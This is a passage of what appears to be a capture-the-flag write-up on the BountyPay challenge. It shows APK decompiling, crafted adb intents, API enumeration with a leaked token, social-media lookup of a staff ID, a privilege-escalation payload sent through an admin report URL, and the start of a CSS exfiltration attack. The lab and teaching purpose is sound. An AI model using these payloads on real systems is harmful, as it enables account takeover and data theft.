                <span class="k">print</span><span class="p">(</span><span class="s">"[Error] {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">line</span><span class="p">))</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="n">wordlist</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">main</span><span class="p">(</span><span class="n">wordlist</span><span class="p">)</span>
</pre></table></code></div></div><p>I let it run and went for a jog, given that the initial request had to follow the redirect requests were a bit slow. When I came back to my surprise I had found something:</p><p><em>Bruteforce interesting result</em></p><p><img src="/assets/posts_details/H1CTF-data/images/content-discovery3.png" alt="Img" /></p><p>I tried to download the APK at <code class="highlighter-rouge">https://software.bountypay.h1ctf.com/uploads/BountyPay.apk</code> using the SSRF but got no data so I then tried accessing it directly and I got the file!</p><h2 id="6-solving-the-android-challenges">6. Solving the Android challenges</h2><h3 id="getting-java-source-code">Getting Java source code</h3><p>Not having a single clue on what to do with an APK I decided to google and found what I needed to do to get the Java source code:</p><ul><li>Unzip the <code class="highlighter-rouge">BountyPay.apk</code> and get the <code class="highlighter-rouge">classes.dex</code> file.</li></ul><p><img src="/assets/posts_details/H1CTF-data/images/apk1.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/apk2.png" alt="Img" /></p><ul><li>Use <code class="highlighter-rouge">dex2jar</code> to extract all the compiled classes from the Dalvik bytecode (<code class="highlighter-rouge">.dex</code>) file into a <code class="highlighter-rouge">.jar</code>.</li></ul><p><img src="/assets/posts_details/H1CTF-data/images/apk3.png" alt="Img" /></p><ul><li>Use <code class="highlighter-rouge">jd-gui</code> to decompile the <code class="highlighter-rouge">.jar</code> classes into readable Java source code.</li></ul><p><img src="/assets/posts_details/H1CTF-data/images/apk4.png" alt="Img" /></p><p>I noticed that we have three interesting classes: <code class="highlighter-rouge">PartOneActivity.class</code>, <code class="highlighter-rouge">PartTwoActivity.class</code> and <code class="highlighter-rouge">PartThreeActivity.class</code>. By reading some of the source code I deduced that to finish this challenge we will need to solve all three parts, one after the other.</p><h3 id="running-the-apk">Running the APK</h3><p>To run the APK I opened up Android Studio and selected <code class="highlighter-rouge">File &gt; Profile or debug APK</code>:</p><p><em>Opening the APK in Android Studio</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android1.png" alt="Img" /></p><p>Then on the top right corner I selected <code class="highlighter-rouge">Run</code>:</p><p><em>Running the application</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android2.png" alt="Img" /></p><p>I then registered a username and Twitter handle, just random <code class="highlighter-rouge">testing</code> strings and got to a white screen where I could tap on the bottom right corner to get some hints:</p><p><em>Activity one hints</em></p><p><img src="/assets/posts_details/H1CTF-data/images/hint.png" alt="Img" /></p><p>I was lost, not knowing anything about Android it was quite difficult to know what to do. I first searched what <code class="highlighter-rouge">Deep links</code> where. I found this nice <a href="https://developer.android.com/training/app-links">page</a> from the Android developer guide where it nicely explains what they are:</p><blockquote><p>Deep links are URLs that take users directly to specific content in your app. In Android, you can set up deep links by adding intent filters and extracting data from incoming intents to drive users to the right activity.</p></blockquote><blockquote><p>An Intent is a messaging object you can use to request an action from another app component.</p></blockquote><p>After that I had a clearer idea: basically we need to find some sort of deep link to activate an Intent, which is an Android action, to go to the next activity. First of all, I followed the Android developer documentation to see how a deep link looks like.</p><p>For it, we need to use <code class="highlighter-rouge">AndroidManifest.xml</code> to get some information out of the APK: the host and scheme. We also need to find the package name, which is easy to find: <code class="highlighter-rouge">bounty.pay</code>.</p><div class="language-xml highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="cp">&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;</span><span class="nt">&lt;manifest</span> <span class="na">xmlns:android=</span><span class="s">"http://schemas.android.com/apk/res/android"</span> <span class="na">android:compileSdkVersion=</span><span class="s">"29"</span> <span class="na">android:compileSdkVersionCodename=</span><span class="s">"10"</span> <span class="na">package=</span><span class="s">"bounty.pay"</span> <span class="na">platformBuildVersionCode=</span><span class="s">"29"</span> <span class="na">platformBuildVersionName=</span><span class="s">"10"</span><span class="nt">&gt;</span>
    ...
    <span class="nt">&lt;application</span> <span class="na">android:allowBackup=</span><span class="s">"true"</span> <span class="na">android:appComponentFactory=</span><span class="s">"androidx.core.app.CoreComponentFactory"</span> <span class="na">android:debuggable=</span><span class="s">"true"</span> <span class="na">android:icon=</span><span class="s">"@mipmap/ic_launcher"</span> <span class="na">android:label=</span><span class="s">"@string/app_name"</span> <span class="na">android:networkSecurityConfig=</span><span class="s">"@xml/network_security_config"</span> <span class="na">android:roundIcon=</span><span class="s">"@mipmap/ic_launcher_round"</span> <span class="na">android:supportsRtl=</span><span class="s">"true"</span> <span class="na">android:theme=</span><span class="s">"@style/AppTheme"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;activity</span> <span class="na">android:label=</span><span class="s">"@string/title_activity_congrats"</span> <span class="na">android:name=</span><span class="s">"bounty.pay.CongratsActivity"</span> <span class="na">android:theme=</span><span class="s">"@style/AppTheme.NoActionBar"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;activity</span> <span class="na">android:label=</span><span class="s">"@string/title_activity_part_three"</span> <span class="na">android:name=</span><span class="s">"bounty.pay.PartThreeActivity"</span> <span class="na">android:theme=</span><span class="s">"@style/AppTheme.NoActionBar"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter</span> <span class="na">android:label=</span><span class="s">""</span><span class="nt">&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.VIEW"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.BROWSABLE"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;data</span> <span class="na">android:host=</span><span class="s">"part"</span> <span class="na">android:scheme=</span><span class="s">"three"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
        <span class="nt">&lt;activity</span> <span class="na">android:label=</span><span class="s">"@string/title_activity_part_two"</span> <span class="na">android:name=</span><span class="s">"bounty.pay.PartTwoActivity"</span> <span class="na">android:theme=</span><span class="s">"@style/AppTheme.NoActionBar"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter</span> <span class="na">android:label=</span><span class="s">""</span><span class="nt">&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.VIEW"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.BROWSABLE"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;data</span> <span class="na">android:host=</span><span class="s">"part"</span> <span class="na">android:scheme=</span><span class="s">"two"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
        <span class="nt">&lt;activity</span> <span class="na">android:label=</span><span class="s">"@string/title_activity_part_one"</span> <span class="na">android:name=</span><span class="s">"bounty.pay.PartOneActivity"</span> <span class="na">android:theme=</span><span class="s">"@style/AppTheme.NoActionBar"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;intent-filter</span> <span class="na">android:label=</span><span class="s">""</span><span class="nt">&gt;</span>
                <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.VIEW"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.DEFAULT"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;category</span> <span class="na">android:name=</span><span class="s">"android.intent.category.BROWSABLE"</span><span class="nt">/&gt;</span>
                <span class="nt">&lt;data</span> <span class="na">android:host=</span><span class="s">"part"</span> <span class="na">android:scheme=</span><span class="s">"one"</span><span class="nt">/&gt;</span>
            <span class="nt">&lt;/intent-filter&gt;</span>
        <span class="nt">&lt;/activity&gt;</span>
        ...
    <span class="nt">&lt;/application&gt;</span>
<span class="nt">&lt;/manifest&gt;</span>
</pre></table></code></div></div><p>We can see that in each of the <code class="highlighter-rouge">intent-filter</code> elements there is data and deduce that for each of the challenges we will have the following: <code class="highlighter-rouge">one://part/</code>, <code class="highlighter-rouge">two://part/</code> and <code class="highlighter-rouge">three://part/</code>.</p><p>With all that found, all the intents will look like this:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>adb shell am start -a android.intent.action.VIEW -d SCHEMA://part/?PARAMETERS bounty.pay
</pre></table></code></div></div><h3 id="activity-one">Activity One</h3><p><em>Activity one screen</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android3.png" alt="Img" /></p><p>Given that there wasn’t anything on the screen, I started doing some source code review to find what I needed to supply and found this piece of code in <code class="highlighter-rouge">PartOneActivity.class</code>:</p><p><em>Source code review I</em></p><p><img src="/assets/posts_details/H1CTF-data/images/jd1.png" alt="Img" /></p><ul><li>We need to supply a parameter named <code class="highlighter-rouge">start</code>: <code class="highlighter-rouge">getIntent().getData().getQueryParameter("start");</code></li><li>The value of that parameter needs to be <code class="highlighter-rouge">PartTwoActivity</code>: <code class="highlighter-rouge">str != null &amp;&amp; str.equals("PartTwoActivity")</code>.</li></ul><p>I then came up with the intent:</p><p><code class="highlighter-rouge">adb shell am start -a android.intent.action.VIEW -d one://part/?start=PartTwoActivity bounty.pay</code></p><p><em>Solving activity one</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android4.png" alt="Img" /></p><h3 id="activity-two">Activity Two</h3><p>Same as before, I started doing the source code review. Knowing what I was looking for, this part was easier.</p><p><em>Source code review II</em></p><p><img src="/assets/posts_details/H1CTF-data/images/jd2.png" alt="Img" /></p><ul><li>We need to supply a parameter named <code class="highlighter-rouge">two</code> with the value <code class="highlighter-rouge">light</code>.</li><li>We need to supply a parameter named <code class="highlighter-rouge">switch</code> with the value <code class="highlighter-rouge">on</code>.</li></ul><p>The resulting intent was:</p><p><code class="highlighter-rouge">adb shell am start -a android.intent.action.VIEW -d "two://part/?two=light\&amp;switch=on" bounty.pay</code></p><blockquote><p>Note: when supplying multiple parameters we need to escape the &amp;.</p></blockquote><p><em>Displaying contents with intent</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android5.png" alt="Img" /></p><p>I copied the hash and used crackstation to crack it and got <code class="highlighter-rouge">Token</code>.</p><p><em>Cracking the hash</em></p><p><img src="/assets/posts_details/H1CTF-data/images/crackstation.png" alt="Img" /></p><p>However, after some code inspection I saw that the application prepended <code class="highlighter-rouge">X-</code>:</p><p><em>Solution to the challenge</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android6.png" alt="Img" /></p><p><em>Solving activity two</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android7.png" alt="Img" /></p><h3 id="activity-three">Activity Three</h3><p>Not surprised that it was an empty white screen I headed straight to the code to see what intent was needed.</p><p><em>Source code review III</em></p><p><img src="/assets/posts_details/H1CTF-data/images/jd3.png" alt="Img" /></p><ul><li>We need to supply a parameter named <code class="highlighter-rouge">three</code> with a base64 decoded value <code class="highlighter-rouge">PartThreeActivity</code>.</li><li>We need to supply a parameter named <code class="highlighter-rouge">switch</code> with a base64 decoded value <code class="highlighter-rouge">on</code>.</li><li>We need to supply a parameter named <code class="highlighter-rouge">header</code> with the value <code class="highlighter-rouge">X-Token</code>.</li></ul><p>I crafted the intent:</p><p><code class="highlighter-rouge">adb shell am start -a android.intent.action.VIEW -d "three://part/?three=UGFydFRocmVlQWN0aXZpdHk=\&amp;switch=b24=\&amp;header=X-Token" bounty.pay</code></p><p><em>Screen after intent</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android8.png" alt="Img" /></p><p>Apparently, the application leaks a hash. Again, I looked at the source code:</p><p><em>Source code of leak</em></p><p><img src="/assets/posts_details/H1CTF-data/images/jd4.png" alt="Img" /></p><p>I ran again all the steps but this time I ran the application in debug mode because that way I could see <code class="highlighter-rouge">Log.d()</code> calls in the <code class="highlighter-rouge">Logcat</code> pane.</p><p><em>Obtaining leaked hash</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android9.png" alt="Img" /></p><p><em>Solving the Android challenges</em></p><p><img src="/assets/posts_details/H1CTF-data/images/android10.png" alt="Img" /></p><p>Android challenges solved! Now I got a token <code class="highlighter-rouge">X-Token: 8e9998ee3137ca9ade8f372739f062c1</code>, which I assumed could be used to query the API (before we couldn’t call it directly, only through the SSRF) given that the leaked host was <code class="highlighter-rouge">api.bountypay.h1ctf.com</code>.</p><h2 id="7-getting-a-staff-account-api-and-twitter-enumeration">7. Getting a staff account: API and Twitter enumeration</h2><p>First of all I checked whether the Token actually worked to access the API or not. For that, I tried to access <code class="highlighter-rouge">brian.oliver</code>’s account information:</p><p><em>Responses with and without token</em></p><p><img src="/assets/posts_details/H1CTF-data/images/enum01.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/enum02.png" alt="Img" /></p><p>Good! Knowing that it worked I thought it was possible to enumerate the API with ffuf to find new endpoints. Interestingly it found the endpoint <code class="highlighter-rouge">/api/staff</code>, which turned out to have <code class="highlighter-rouge">staff_id</code> values.</p><p><em>Running ffuf on the api</em></p><p><img src="/assets/posts_details/H1CTF-data/images/enum1.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/enum3.png" alt="Img" /></p><p>After that, I tried common REST endpoints given the structure the api followed with accounts. I figured that if <code class="highlighter-rouge">/api/accounts/account_id/</code> existed then <code class="highlighter-rouge">/api/staff/staff_id/</code> would also exist. But I was wrong, it didn’t. After further enumeration I decided to try other HTTP methods, as in REST we can have the same endpoint for different purposes depending on the method used. As an example:</p><ul><li><code class="highlighter-rouge">GET /accounts</code> can be used to retrieve all accounts data in the application.</li><li><code class="highlighter-rouge">POST /accounts</code> can be used to create a new account.</li></ul><p>Indeed, the <code class="highlighter-rouge">/api/staff</code> endpoint turned out to have a different response for <code class="highlighter-rouge">POST</code> requests.</p><p><em>Staff endpoint POST response</em></p><p><img src="/assets/posts_details/H1CTF-data/images/enum2.png" alt="Img" /></p><p>I tried with the most logical parameter, which was <code class="highlighter-rouge">staff_id</code>.</p><p><em>Invalid staff_id provided</em></p><p><img src="/assets/posts_details/H1CTF-data/images/enum4.png" alt="Img" /></p><p>At this point I was lost, none of the two IDs I had retrieved were working and my enumeration was going nowhere. Then, one friend pointed me in the right direction and told me to enumerate somewhere else: Twitter.</p><p><em>BountyPay Twitter account</em></p><p><img src="/assets/posts_details/H1CTF-data/images/enum6.png" alt="Img" /></p><p>I saw that in their most recent tweet there was a new employee, Sandra, and checked if she was following the account (there were only 3 followers). On her account I found a picture of her with her badge which contained her <code class="highlighter-rouge">staff_id</code>, bingo!</p><p><em>BountyPay Twitter account enumeration</em></p><p><img src="/assets/posts_details/H1CTF-data/images/enum7.png" alt="Img" /></p><p><em>Sandra’s Twitter account</em></p><p><img src="/assets/posts_details/H1CTF-data/images/enum8.png" alt="Img" /></p><p>I then noted it down in my notes, <code class="highlighter-rouge">STF:8FJ3KFISL3</code>, and tried to use it in <code class="highlighter-rouge">/api/staff/</code>.</p><p><em>Sandra’s credentials</em></p><p><img src="/assets/posts_details/H1CTF-data/images/enum5.png" alt="Img" /></p><h2 id="8-from-staff-to-admin-chaining-different-flaws">8. From staff to admin: chaining different flaws</h2><p>Once with Sandra’s credentials, <code class="highlighter-rouge">sandra.allison:s%3D8qB8zEpMnc*xsz7Yp5</code>, I logged in to her account at <code class="highlighter-rouge">staff.bountypay.h1ctf.com</code>:</p><p><em>Staff dashboard</em></p><p><img src="/assets/posts_details/H1CTF-data/images/staff1.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/staff2.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/staff3.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/staff4.png" alt="Img" /></p><p><img src="/assets/posts_details/H1CTF-data/images/staff5.png" alt="Img" /></p><p>I started checking out the <code class="highlighter-rouge">Support Tickets</code> tab and looked for IDORs in the tickets, but couldn’t get anything. Then, I looked at the source code and at the bottom found something interesting:</p><p><img src="/assets/posts_details/H1CTF-data/images/staff6.png" alt="Img" /></p><p>The url variable was: <code class="highlighter-rouge">/?template=home</code> (the page I was in).</p><p>The contents of <code class="highlighter-rouge">website.js</code> are:</p><div class="language-js highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.upgradeToAdmin</span><span class="dl">"</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">t</span> <span class="o">=</span> <span class="nx">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">input[name="username"]</span><span class="dl">'</span><span class="p">).</span><span class="nx">val</span><span class="p">();</span>
    <span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/admin/upgrade?username=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">t</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">User Upgraded to Admin</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">})</span>
<span class="p">}),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.tab</span><span class="dl">"</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.tab</span><span class="dl">"</span><span class="p">).</span><span class="nx">removeClass</span><span class="p">(</span><span class="dl">"</span><span class="s2">active</span><span class="dl">"</span><span class="p">),</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="dl">"</span><span class="s2">active</span><span class="dl">"</span><span class="p">),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">div.content</span><span class="dl">"</span><span class="p">).</span><span class="nx">addClass</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">div.content-</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">$</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="nx">attr</span><span class="p">(</span><span class="dl">"</span><span class="s2">data-target</span><span class="dl">"</span><span class="p">)).</span><span class="nx">removeClass</span><span class="p">(</span><span class="dl">"</span><span class="s2">hidden</span><span class="dl">"</span><span class="p">),</span> <span class="o">!</span><span class="mi">1</span>
<span class="p">}),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.sendReport</span><span class="dl">"</span><span class="p">).</span><span class="nx">click</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
    <span class="nx">$</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/admin/report?url=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">url</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
        <span class="nx">alert</span><span class="p">(</span><span class="dl">"</span><span class="s2">Report sent to admin team</span><span class="dl">"</span><span class="p">)</span>
    <span class="p">}),</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">#myModal</span><span class="dl">"</span><span class="p">).</span><span class="nx">modal</span><span class="p">(</span><span class="dl">"</span><span class="s2">hide</span><span class="dl">"</span><span class="p">)</span>
<span class="p">}),</span>
<span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="dl">"</span><span class="s2">#tab1</span><span class="dl">"</span> <span class="o">===</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span> <span class="o">&amp;&amp;</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.tab1</span><span class="dl">"</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">),</span>
<span class="dl">"</span><span class="s2">#tab2</span><span class="dl">"</span> <span class="o">===</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span> <span class="o">&amp;&amp;</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.tab2</span><span class="dl">"</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">),</span>
<span class="dl">"</span><span class="s2">#tab3</span><span class="dl">"</span> <span class="o">===</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span> <span class="o">&amp;&amp;</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.tab3</span><span class="dl">"</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">),</span>
<span class="dl">"</span><span class="s2">#tab4</span><span class="dl">"</span> <span class="o">===</span> <span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nx">hash</span> <span class="o">&amp;&amp;</span> <span class="nx">$</span><span class="p">(</span><span class="dl">"</span><span class="s2">.tab4</span><span class="dl">"</span><span class="p">).</span><span class="nx">trigger</span><span class="p">(</span><span class="dl">"</span><span class="s2">click</span><span class="dl">"</span><span class="p">));</span>
</pre></table></code></div></div><p>Things I noted where:</p><ul><li>On clicking an element with the <code class="highlighter-rouge">upgradeToAdmin</code> class, we make a request to <code class="highlighter-rouge">/admin/upgrade</code> with the username as the value of the <code class="highlighter-rouge">input</code> element that has the name attribute set to <code class="highlighter-rouge">username</code>.</li><li>If we have a hash in the URL the JS snippet will trigger a click on that tab: <code class="highlighter-rouge">URL#tab2</code> will load and trigger a click to show the second tab.</li><li>The <code class="highlighter-rouge">Report This Page</code> sends the URL variable (current URL base64 encoded) to <code class="highlighter-rouge">/admin/report</code> for admins to check out. Hmmmm…</li></ul><p>So now it was clear, we needed to make a request to <code class="highlighter-rouge">/admin/upgrade</code> to become admins. But it wasn’t that easy…</p><p><em>Upgrade to admin functionality</em></p><p><img src="/assets/posts_details/H1CTF-data/images/staff7.png" alt="Img" /></p><p>Time to do some testing of the application! Here are my findings:</p><ul><li>The avatar we choose can be <code class="highlighter-rouge">avatar1</code>, <code class="highlighter-rouge">avatar2</code> or <code class="highlighter-rouge">avatar3</code> and then to display it the application includes it in a CSS class.</li></ul><p><img src="/assets/posts_details/H1CTF-data/images/staff8.png" alt="Img" /></p><ul><li>The JS file mentions a <code class="highlighter-rouge">tab4</code>, but the <code class="highlighter-rouge">Logout</code> tab has no CSS id.</li></ul><p><img src="/assets/posts_details/H1CTF-data/images/staff9.png" alt="Img" /></p><ul><li>We can include multiple templates by supplying the argument as an array: <code class="highlighter-rouge">/?template[]=login&amp;template[]=home</code>.</li></ul><p>With all this in mind I came up with a possible plan:</p><ul><li>Intercept the traffic and set the avatar to <code class="highlighter-rouge">upgradeToAdmin tab4</code>, as there is no element with the class <code class="highlighter-rouge">tab4</code> we can set our avatar to it and then trigger a click appending <code class="highlighter-rouge">#tab4</code> to the URL.</li><li>Load two templates: <code class="highlighter-rouge">login</code> and <code class="highlighter-rouge">ticket</code>. We load <code class="highlighter-rouge">login</code> because it has <code class="highlighter-rouge">input[name="username"]</code> and <code class="highlighter-rouge">ticket</code> because it will display our avatar.</li><li>Set our username in the <code class="highlighter-rouge">login</code> template passing the parameter <code class="highlighter-rouge">username</code>, which gets reflected in the input.</li></ul><p>The payload is then:</p><div class="highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/?template[]=login&amp;template[]=ticket&amp;ticket_id=3582&amp;username=sandra.allison#tab4
</pre></table></code></div></div><p><em>Final payload to elevate privielges to admin</em></p><p><img src="/assets/posts_details/H1CTF-data/images/staff10.png" alt="Img" /></p><p>I then made the request to <code class="highlighter-rouge">/admin/report?url=Lz90ZW1wbGF0ZVtdPWxvZ2luJnRlbXBsYXRlW109dGlja2V0JnRpY2tldF9pZD0zNTgyJnVzZXJuYW1lPXNhbmRyYS5hbGxpc29uI3RhYjQ=</code> and was admin!</p><p><em>Admin tab</em></p><p><img src="/assets/posts_details/H1CTF-data/images/staff11.png" alt="Img" /></p><p>And we get the credentials for <code class="highlighter-rouge">marten.mickos</code>: <code class="highlighter-rouge">h&amp;H5wy2Lggj*kKn4OD&amp;Ype</code>!</p><blockquote><p>I must say that I spent a lot of time on this challenge because I was supplying the array parameters with indices: template[0]=login&amp;template[1]=ticket (which worked locally but not when reporting the URL). After solving the CTF, I sent a message to one of the creators, Adam Langley, to ask why this was happening and apparently the backend code was only looking for []. Still, it taught me to always keep trying things!</p></blockquote><h2 id="9-bypassing-the-last-2fa-css-secrets-stealer">9. Bypassing the last 2FA: CSS secrets stealer!</h2><p>I went back to the main app, logged in with the new credentials and, after bypassing the 2FA from before, I could see the payments! Finally, I was really close to solving the whole thing!</p><p><em>Payments required</em></p><p><img src="/assets/posts_details/H1CTF-data/images/final1.png" alt="Img" /></p><p>Apparently, to solve it we first need to start the challenge and then provide the code within 2 minutes.</p><p><em>Last challenge</em></p><p><img src="/assets/posts_details/H1CTF-data/images/final2.png" alt="Img" /></p><p><em>New code required</em></p><p><img src="/assets/posts_details/H1CTF-data/images/final3.png" alt="Img" /></p><p>There weren’t any hints on the source code so I analysed the traffic using Burp:</p><p><em>Request to start the challenge</em></p><p><img src="/assets/posts_details/H1CTF-data/images/final4.png" alt="Img" /></p><p><em>Request to supply the 2FA code</em></p><p><img src="/assets/posts_details/H1CTF-data/images/final5.png" alt="Img" /></p><p>What was weird about this 2FA was the first request, as <code class="highlighter-rouge">app_style</code> contained the URL of a stylesheet <a href="https://www.bountypay.h1ctf.com/css/uni_2fa_style.css">https://www.bountypay.h1ctf.com/css/uni_2fa_style.css</a>:</p><div class="language-css highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c">/**
Template for the UNI 2FA App
 */</span>

<span class="nt">body</span> <span class="p">{</span>
    <span class="nl">background-color</span><span class="p">:</span> <span class="m">#FFFFFF</span><span class="p">;</span>
<span class="p">}</span>

<span class="nt">div</span><span class="nc">.branding</span> <span class="p">{</span>
    <span class="nl">height</span><span class="p">:</span><span class="m">80px</span><span class="p">;</span>
    <span class="nl">width</span><span class="p">:</span><span class="m">80px</span><span class="p">;</span>
    <span class="nl">margin</span><span class="p">:</span><span class="m">20px</span> <span class="nb">auto</span> <span class="m">40px</span> <span class="nb">auto</span><span class="p">;</span>
    <span class="nl">background-image</span><span class="p">:</span><span class="sx">url("https://www.bountypay.h1ctf.com/images/bountypay.png")</span><span class="p">;</span>
    <span class="nl">background-position</span><span class="p">:</span><span class="nb">center</span> <span class="nb">center</span><span class="p">;</span>
    <span class="nl">background-repeat</span><span class="p">:</span> <span class="nb">no-repeat</span><span class="p">;</span>
    <span class="nl">background-size</span><span class="p">:</span> <span class="n">cover</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>I checked wiht ngrok and indeed I received a request, so I thought that could be the attack vector. After many attempts I thought that maybe the CSS was indeed being used somewhere. Therefore the vulnerability could be a Blind CSS injection via which we can exfiltrate data back to our server (also called CSS exfil). This is the <a href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/">article I used as reference</a>.</p><h3 id="about-css-exfil">About CSS Exfil</h3><blockquote><p>The [attribute=”value”] selector is used to select elements with a specified attribute and value. E.g.</p></blockquote><div class="language-css highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nf">#username</span><span class="o">[</span><span class="nt">value</span><span class="o">~=</span><span class="s1">"test"</span><span class="o">]</span> <span class="p">{</span> <span class="err">//</span> <span class="err">would</span> <span class="err">only</span> <span class="err">apply</span> <span class="err">to</span> <span class="err">the</span> <span class="err">element</span> <span class="err">with</span> <span class="err">id</span> <span class="err">username</span> <span class="err">that</span> <span class="err">contains</span> <span class="err">"test"</span>
  <span class="nl">border</span><span class="p">:</span> <span class="m">5px</span> <span class="nb">solid</span> <span class="no">yellow</span><span class="p">;</span>
<span class="p">}</span>
